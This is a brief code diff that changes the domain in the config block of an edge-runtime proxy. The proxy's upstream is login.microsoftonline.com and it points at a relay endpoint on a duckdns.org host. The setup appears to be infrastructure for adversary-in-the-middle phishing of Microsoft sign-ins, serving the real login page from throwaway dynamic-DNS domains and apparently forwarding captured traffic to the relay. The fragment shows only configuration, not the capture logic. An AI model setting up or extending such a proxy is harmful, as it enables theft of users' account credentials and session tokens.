@@ -1,7 +1,7 @@
 export const runtime = 'edge';
 
 // ==================== CONFIG ====================
-const YOUR_DOMAIN = 'proxyapp.ddns.net';
+const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
 const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
 const INITIAL_UPSTREAM = 'login.microsoftonline.com';
 const PROXY_PREFIX = '/_p/';
